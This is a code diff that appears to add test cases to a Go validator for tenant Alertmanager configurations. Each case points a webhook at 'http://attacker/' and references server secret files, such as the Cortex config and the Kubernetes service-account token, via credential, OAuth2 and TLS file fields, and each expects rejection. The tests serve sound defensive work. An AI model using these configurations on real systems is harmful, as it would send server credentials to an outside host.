@@ -252,13 +252,79 @@ var amCfgValidationTests = []struct {
           smtp_smarthost: localhost:25
           smtp_from: alertmanager@example.org
         route:
-          receiver: noop
+          receiver: webhook
 
         receivers:
-        - name: noop
-          slack_configs:
-          - api_url: http://slack`,
-		shouldFail: false,
+        - name: webhook
+          webhook_configs:
+          - url: http://attacker/
+            http_config:
+              bearer_token_file: /etc/cortex/cortex.yaml`,
+		shouldFail:  true,
+		errContains: "password_file, bearer_token_file and credentials_file is not allowed",
+	}, {
+		config: `
+        global:
+          smtp_smarthost: localhost:25
+          smtp_from: alertmanager@example.org
+        route:
+          receiver: webhook
+
+        receivers:
+        - name: webhook
+          webhook_configs:
+          - url: http://attacker/
+            http_config:
+              basic_auth:
+                username: u
+                password_file: /etc/cortex/cortex.yaml`,
+		shouldFail:  true,
+		errContains: "password_file, bearer_token_file and credentials_file is not allowed",
+	}, {
+		config: `
+        route:
+          receiver: webhook
+
+        receivers:
+        - name: webhook
+          webhook_configs:
+          - url: http://attacker/
+            http_config:
+              authorization:
+                type: Bearer
+                credentials_file: /var/run/secrets/kubernetes.io/serviceaccount/token`,
+		shouldFail:  true,
+		errContains: "password_file, bearer_token_file and credentials_file is not allowed",
+	}, {
+		config: `
+        route:
+          receiver: webhook
+
+        receivers:
+        - name: webhook
+          webhook_configs:
+          - url: http://attacker/
+            http_config:
+              oauth2:
+                client_id: id
+                client_secret_file: /etc/cortex/cortex.yaml
+                token_url: http://attacker/token`,
+		shouldFail:  true,
+		errContains: "OAuth2 client_secret_file is not allowed",
+	}, {
+		config: `
+        route:
+          receiver: webhook
+
+        receivers:
+        - name: webhook
+          webhook_configs:
+          - url: http://attacker/
+            http_config:
+              tls_config:
+                ca_file: /etc/cortex/cortex.yaml`,
+		shouldFail:  true,
+		errContains: "TLS ca_file, cert_file and key_file is not allowed",
 	},
 }
 
